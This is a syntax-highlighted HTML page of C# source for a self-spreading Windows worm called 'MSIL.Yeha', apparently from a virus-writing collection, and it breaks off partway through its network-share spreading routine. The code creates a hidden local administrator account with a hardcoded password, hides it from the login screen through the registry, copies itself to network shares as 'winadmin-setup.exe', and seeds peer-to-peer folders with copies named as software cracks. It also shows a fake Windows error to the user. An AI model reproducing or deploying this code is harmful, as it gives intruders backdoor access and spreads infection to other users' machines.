<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>P2P-Worm.MSIL.Small.e - MSIL.Yeha.cs.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc3 {
	color: #008080;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc13 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">/*************************************************************
 * C# - MSIL.Yeha
 * &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
 * by free0n
 * vx13d.net free0n@vx13d.net
 * ###########################################################
 * 
 * Yeha works by first checking itself in the registry
 * if it hasn't ran yet it will attempt to create a
 * new hidden local admin user account named Yeha with the 
 * password yehawashere. After the account is created
 * it creates a new network share in C:\Yeha and makes the
 * directory as hidden. This is so if someone is browsing
 * the network we might lure them in. Each time the exe 
 * is run it will spread to any open network shares that 
 * were found in the mru list in the registry. It copies 
 * as winadmin-setup.exe.
 * 
 * After the share spreading is completed it copies itself
 * to commonly shared p2p folders as cracks for programs
 * found in the program files directory. For example if 
 * Trilian directory is found it creates a trillian-crack.exe
 * once the p2p is done it will display message if the day
 * is the 25th that Yeha has been here if it's not it 
 * displays a common windows error message.
 * 
 * Note: This uses the same trick as Snoopy did as 
 * it looks like a console application but the output 
 * type is windows application so we don't get a dorky 
 * cmd window popping up when it's ran. Compiled with
 * MS Visual C# express 
 * 
 * thx RRLF!
 * keep vxing!
 * &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
 ************************************************************/</span><span class="sc0">
</span><span class="sc3">/************************************************************
 * Start of Program.cs
 * &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
 ************************************************************/</span><span class="sc0">

</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Collections</span><span class="sc10">.</span><span class="sc11">Generic</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Windows</span><span class="sc10">.</span><span class="sc11">Forms</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">Yeha</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">Program</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Main</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">args</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc11">Yeha</span><span class="sc0"> </span><span class="sc11">yeha</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Yeha</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">yeha</span><span class="sc10">.</span><span class="sc11">chkIt</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">yeha</span><span class="sc10">.</span><span class="sc11">YehaUser</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">yeha</span><span class="sc10">.</span><span class="sc11">CreateShare</span><span class="sc10">(</span><span class="sc13">@"C:\Yeha"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Yeha"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            
            </span><span class="sc11">yeha</span><span class="sc10">.</span><span class="sc11">Share</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">yeha</span><span class="sc10">.</span><span class="sc11">p2p</span><span class="sc10">();</span><span class="sc0">
            
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">Day</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">25</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">MessageBox</span><span class="sc10">.</span><span class="sc11">Show</span><span class="sc10">(</span><span class="sc6">"Yeha was here!"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Yeha"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MessageBoxButtons</span><span class="sc10">.</span><span class="sc11">OK</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MessageBoxIcon</span><span class="sc10">.</span><span class="sc11">Information</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">MessageBox</span><span class="sc10">.</span><span class="sc11">Show</span><span class="sc10">(</span><span class="sc6">"Not a valid win32 program"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Windows"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MessageBoxButtons</span><span class="sc10">.</span><span class="sc11">OK</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MessageBoxIcon</span><span class="sc10">.</span><span class="sc11">Error</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc3">/************************************************************
 * Start of Yeha.cs
 * &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
 ************************************************************/</span><span class="sc0">

</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Diagnostics</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">DirectoryServices</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">Microsoft</span><span class="sc10">.</span><span class="sc11">Win32</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Collections</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Collections</span><span class="sc10">.</span><span class="sc11">Generic</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Management</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">Yeha</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">Yeha</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">me</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc11">Process</span><span class="sc10">.</span><span class="sc11">GetCurrentProcess</span><span class="sc10">().</span><span class="sc11">MainModule</span><span class="sc10">.</span><span class="sc11">FileName</span><span class="sc10">);</span><span class="sc0">
        
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">chkIt</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//checking the registry to see if we have already ran. If 
</span><span class="sc0">            </span><span class="sc2">//we aren't found in the registry we add the value.
</span><span class="sc0">            </span><span class="sc2">//Hkey local machine is good real estate ;)
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">regstr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">string</span><span class="sc10">)</span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">GetValue</span><span class="sc10">(</span><span class="sc13">@"HKEY_LOCAL_MACHINE\SOFTWARE\Yeha"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Yeha"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Yeha"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">regstr</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">"Yeha"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">RegistryKey</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">LocalMachine</span><span class="sc10">.</span><span class="sc11">OpenSubKey</span><span class="sc10">(</span><span class="sc6">"Software"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">RegistryKey</span><span class="sc0"> </span><span class="sc11">newkey</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">.</span><span class="sc11">CreateSubKey</span><span class="sc10">(</span><span class="sc6">"Yeha"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">newkey</span><span class="sc10">.</span><span class="sc11">SetValue</span><span class="sc10">(</span><span class="sc6">"Yeha"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">me</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">p2p</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc2">//our p2p spreading is basically just a list of common folders
</span><span class="sc0">            </span><span class="sc2">//if the folder exists we drop a copies of ourselves as cracks
</span><span class="sc0">            </span><span class="sc2">//for programs we find the program files folder
</span><span class="sc0">
            </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">arSharedFolders</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">arSharedFolders</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">GetFolderPath</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">SpecialFolder</span><span class="sc10">.</span><span class="sc11">MyDocuments</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\\Downloads"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">arSharedFolders</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">GetFolderPath</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">SpecialFolder</span><span class="sc10">.</span><span class="sc11">MyDocuments</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\\My Shared Folder"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">arSharedFolders</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">GetFolderPath</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">SpecialFolder</span><span class="sc10">.</span><span class="sc11">MyDocuments</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\\Shared"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">arSharedFolders</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">GetFolderPath</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">SpecialFolder</span><span class="sc10">.</span><span class="sc11">ApplicationData</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\\Ares\\My Shared Folder"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">arSharedFolders</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">GetFolderPath</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">SpecialFolder</span><span class="sc10">.</span><span class="sc11">Desktop</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\\Downloads"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">arSharedFolders</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">GetFolderPath</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">SpecialFolder</span><span class="sc10">.</span><span class="sc11">ProgramFiles</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\\Shareaza\\Downloads"</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">IEnumerator</span><span class="sc0"> </span><span class="sc11">folder</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">arSharedFolders</span><span class="sc10">.</span><span class="sc11">GetEnumerator</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">folder</span><span class="sc10">.</span><span class="sc11">MoveNext</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">tada</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc11">folder</span><span class="sc10">.</span><span class="sc11">Current</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">tada</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">progDir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">GetFolderPath</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">SpecialFolder</span><span class="sc10">.</span><span class="sc11">ProgramFiles</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetDirectories</span><span class="sc10">(</span><span class="sc11">progDir</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">app</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">tada</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\\"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc11">d</span><span class="sc10">.</span><span class="sc11">LastIndexOf</span><span class="sc10">(</span><span class="sc6">"\\"</span><span class="sc10">)).</span><span class="sc11">Replace</span><span class="sc10">(</span><span class="sc6">"\\"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc10">.</span><span class="sc11">Empty</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"-crack.exe"</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">app</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">YehaUser</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc5">try</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

                </span><span class="sc2">//create our new admin user account on the local machine we are running on.
</span><span class="sc0">                </span><span class="sc11">DirectoryEntry</span><span class="sc0"> </span><span class="sc11">ad</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">DirectoryEntry</span><span class="sc10">(</span><span class="sc6">"WinNT://"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">MachineName</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">",computer"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">DirectoryEntry</span><span class="sc0"> </span><span class="sc11">usr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ad</span><span class="sc10">.</span><span class="sc11">Children</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc6">"Yeha"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"user"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">usr</span><span class="sc10">.</span><span class="sc11">Invoke</span><span class="sc10">(</span><span class="sc6">"SetPassword"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc5">object</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc6">"yehawashere"</span><span class="sc0"> </span><span class="sc10">});</span><span class="sc0">
                </span><span class="sc11">usr</span><span class="sc10">.</span><span class="sc11">CommitChanges</span><span class="sc10">();</span><span class="sc0">

                </span><span class="sc11">DirectoryEntry</span><span class="sc0"> </span><span class="sc11">de</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">de</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ad</span><span class="sc10">.</span><span class="sc11">Children</span><span class="sc10">.</span><span class="sc11">Find</span><span class="sc10">(</span><span class="sc6">"Administrators"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"group"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">de</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">de</span><span class="sc10">.</span><span class="sc11">Invoke</span><span class="sc10">(</span><span class="sc6">"Add"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc5">object</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">usr</span><span class="sc10">.</span><span class="sc11">Path</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">});</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                
                </span><span class="sc2">//now we need to make the user hidden from the login screen and the
</span><span class="sc0">                </span><span class="sc2">//user accounts applet in the control panel to do this we
</span><span class="sc0">                </span><span class="sc2">//use a reg hack. 
</span><span class="sc0">
                </span><span class="sc5">try</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">rkey</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">SetValue</span><span class="sc10">(</span><span class="sc11">rkey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Yeha"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">RegistryValueKind</span><span class="sc10">.</span><span class="sc11">DWord</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">er</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">ex</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Share</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc2">//copy ourselves to all the local network shares on the computer
</span><span class="sc0">            </span><span class="sc2">//this could be good bait when someone connects and wonders what
</span><span class="sc0">            </span><span class="sc2">//winadmin-setup is. 
</span><span class="sc0">
            </span><span class="sc5">try</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">ManagementObjectSearcher</span><span class="sc0"> </span><span class="sc11">shares</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0">
                </span><span class="sc11">ManagementObjectSearcher</span><span class="sc10">(</span><span class="sc6">"select * from win32_share"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ManagementObject</span><span class="sc0"> </span><span class="sc11">serv</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">shares</span><span class="sc10">.</span><span class="sc11">Get</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">shareName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc11">serv</span><span class="sc10">[</span><span class="sc6">"Name"</span><span class="sc10">]);</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">shareName</span><span class="sc10">.</span><span class="sc11">Contains</span><span class="sc10">(</span><span class="sc6">"$"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc13">@"\\"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">MachineName</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc13">@"\"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">shareName</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc13">@"\winadmin-setup.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">ex</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">//now we need to copy ourselves to other shares
</span><span class="sc0">            </span><span class="sc2">//on the network to do this we check for network shares
</span><span class="sc0">            </span><span class="sc2">//in the MRU list, we may get lucky we may not
</span><span class="sc0">
            </span><span class="sc5">try</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU\"</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">RegistryKey</span><span class="sc0"> </span><span class="sc11">reg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">CurrentUser</span><span class="sc10">.</span><span class="sc11">OpenSubKey</span><span class="sc10">(</span><span class="sc11">key</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">valuename</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">reg</span><span class="sc10">.</span><span class="sc11">GetValueNames</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
